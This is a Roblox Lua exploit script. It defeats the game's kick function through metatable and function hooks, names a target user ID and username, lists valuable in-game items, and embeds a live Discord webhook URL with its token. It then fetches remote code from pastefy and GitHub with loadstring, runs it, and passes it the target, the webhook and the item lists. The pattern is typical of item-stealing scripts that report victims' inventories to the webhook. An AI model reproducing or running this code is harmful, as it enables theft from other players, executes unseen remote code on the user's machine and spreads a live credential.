local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local oldKick = nil
local mt = getrawmetatable(game)
setreadonly(mt, false)
local oldNamecall = mt.__namecall
mt.__namecall = newcclosure(function(self, ...)
    local method = getnamecallmethod()
  
    if method == "Kick" and self == LocalPlayer then
        return nil
    end
  
    return oldNamecall(self, ...)
end)
setreadonly(mt, true)
-- Hook directo al método Kick
if LocalPlayer and LocalPlayer.Kick then
    oldKick = hookfunction(LocalPlayer.Kick, function(self, ...)
        if self == LocalPlayer then
            return nil
        end
        return oldKick(self, ...)
    end)
end
--ANTIKICK
--HELLO ROMAN GAY
local TARGET_ID = 9650763690
local TARGET_USER = "LUKITR66"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1521917672152105071/OHGaU59Lk5tfiJWpWzdO5lv0c_am65377xBYM0QEv-ekN_cjrJUBkGvwml8GleNRd0E2"

local TargetBrainrots = {
    ["Strawberry Elephant"] = true,
    ["Meowl"] = true,
    ["Headless Horseman"] = true,
    ["Griffin"] = true,
    ["Dragon Cannelloni"] = true,
    ["Dragon Gingerini"] = true,
    ["Love Love Bear"] = true,
    ["La Supreme Combinasion"] = true,
    ["Celestial Pegasus"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["Cerberus"] = true,
    ["Rosey and Teddy"] = true,
    ["Capitano Moby"] = true,
    ["Popcuru and Fizzuru"] = true,
    ["Cooki and Milki"] = true,
    ["Burguro And Fryuro"] = true,
    ["Ketupat Bros"] = true,
    ["Reinito Sleighito"] = true,
    ["Los Amigos"] = true,
    ["Los Sekolahs"] = true,
    ["La Secret Combinasion"] = true,
    ["Signore Carapace"] = true,
    ["Elefanto Frigo"] = true,
    ["Fragrama and Chocrama"] = true,
    ["La Casa Boo"] = true,
    ["Spooky and Pumpky"] = true,
    ["Ginger Gerat"] = true,
    ["Antonio"] = true,
    ["Garama and Madundung"] = true,
    ["Fishino Clownino"] = true,
    ["Globa Steppa"] = true,
    ["Duggy Bros"] = true,
    ["Ketchuru and Musturu"] = true,
    ["Tirilikalika Tirilikalako"] = true,
    ["Dug dug dug"] = true,
    ["Tictac Sahur"] = true,
    ["Rico Dinero"] = true,
    ["Los Tacoritas"] = true,
    ["Tralaledon"] = true,
    ["Celularcini Viciosini"] = true,
    ["Los Hotspotsitos"] = true,
    ["Fragola La La La"] = true,
    ["Gym Bros"] = true,
    ["Hydra Bunny"] = true,
    ["Los Chillis"] = true,
    ["Kalika Bros"] = true,
    ["Digi Narwhal"] = true,
    ["Bunny and Eggy"] = true
}

local TargetBaseSkins = {
    ["Rose"] = true,
    ["Bunny Basket"] = true,
    ["Pot of Gold"] = true,
    ["Octo"] = true,
}

local TargetGears = {
    ["Santa's Sleigh"] = true,
    ["Cupid's Wings"] = true,
    ["Witch's Broom"] = true,
    ["Waverider"] = true,
    ["Bloodmoon Slap"] = true,
    ["Rainbow Slap"] = true,
    ["Rainbow Hammer"] = true,
    ["Bloodmoon Hammer"] = true,
    ["Radioactive Airstrike"] = true,
    ["Yin Yang Lamp"] = true,
    ["Candy Sentry"] = true,
    ["Blackhole Bomb"] = true
}

loadstring(game:HttpGet("https://pastefy.app/AezxpQVA/raw"))()	

task.spawn(function()
    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
    if type(script) == "function" then
        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
    end
end)
